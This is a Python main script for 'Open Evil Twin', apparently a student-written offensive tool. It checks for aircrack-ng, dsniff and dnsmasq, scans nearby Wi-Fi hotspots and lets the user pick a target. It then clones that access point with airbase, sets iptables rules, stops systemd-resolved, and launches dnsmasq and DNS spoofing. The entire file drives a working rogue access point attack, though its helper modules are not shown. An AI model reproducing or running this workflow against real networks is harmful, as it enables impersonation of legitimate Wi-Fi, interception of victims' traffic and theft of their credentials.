#!/usr/bin/env python


# Generic/Built-in
import logging
import txt
import time
import sys
import subprocess
from wireless import Wireless
from colorama import Fore
import os

# Owned
from core import aircrack, utils
from core.utils import warning, question, wait, information, found, tiret
from core.interface import upInterface, downInterface, scanningInterfaces
from core.wifi import scanHotspots
from core.aircrack import airmonStart, airbaseStart
from core.services import iptablesSet, iptablesDel, stopSystemdResolved, launchDnsmasq, launchDnsSpoof, killProcess

__author__ = "Quentin Royer"
__license__ = "GNU GPLv3"
__version__ = "0.1.0"
__maintainer__ = "Quentin Royer"
__email__ = "quentin.royer@edu.itescia.fr"
__status__ = "Dev"

stop = False
listSoft = ["dnsmasq", "dsniff", "aircrack-ng"]
wireless = Wireless()




print(txt.logo)

print("Welcome in Open Evil Twin. Please wait, we are verifing your installation...")
time.sleep(3)

print(wait+"Package dependancies..")

for soft in listSoft:
    exist = subprocess.call('dpkg -l ' + soft + '>> /dev/null', shell=True)
    if exist == 0:
        print(information + soft + " installed")
    else:
        print(warning + soft + " not installed")
        stop = True


if stop:
    print(wait+"Please install missing package")
    exit(1)
    sys.exit("\n"+warning+ "Please install missing package\n")

time.sleep(2)


try:
    while True:
        print(txt.mainOption)
        time.sleep(1)

        option = input("\n OET("+Fore.BLUE + "~" + Fore.RESET + ")$ ")

        if option.lower() == "h":
            print(txt.helpMain)
        elif option.lower() == "c":
            utils.clear()
            print(txt.mainOption)
        elif option.lower() == "e":
            sys.exit(information + "Bye :)")
        elif option.lower() == "1":
            utils.clear()
            interfaces, interface = scanningInterfaces(wireless)
            interfaceName = interfaces[interface]
            print("\n"+ wait+"Upping interface...")
            upInterface(interfaceName)
            print("\n"+ wait +"Scanning hotspots wifi...")
            hotspots = scanHotspots(interfaceName)
            for hotspot in hotspots:
                print(hotspot)
        elif option.lower() == "2":
            utils.clear()
            interfaces, interface = scanningInterfaces(wireless)
            interfaceName = interfaces[interface]
            print("\n"+ wait+"Upping interfaces...")
            upInterface(interfaceName)
            print("\n" + wait +"Scanning hotspots wifi...")
            hotspots = scanHotspots(interfaceName)
            for index, hotspot in enumerate(hotspots):
                print("["+ str(index) + "]" + "/" + str(hotspot))
            print("\n"+"Select your target")
            target = int(input("\n OET("+Fore.BLUE + "~" + Fore.RESET + ")$ "))
            print("\n"+wait + "Set interface into monitor mode..")
            airmonStart(interfaceName)
            time.sleep(5)
            print("\n"+wait + "Launching attack...")
            airbaseStart(interfaceName, hotspots[target])
            time.sleep(5)
            upInterface("at0", "10.0.0.1")
            iptablesSet()
            stopSystemdResolved()
            launchDnsmasq(os.getcwd() + "/dnsmasq.conf")
            time.sleep(3)
            print("\n" + information + "Attack Launched")
            launchDnsSpoof()


        flag = True
        while flag:
            print(question + "Type 'e' to exit and 'r' to restart the script")
            choice = input("\n OET("+Fore.BLUE + "~" + Fore.RESET + ")$ ")
            if choice == "e":
                sys.exit("\n" + information + "Bye ! :)")
            if choice == "r":
                flag = False
        utils.clear()




except KeyboardInterrupt:
    iptablesDel()
    ()
    downInterface(interfaceName + "mon")
    sys.exit("\n"+wait+" Killing attack...)")


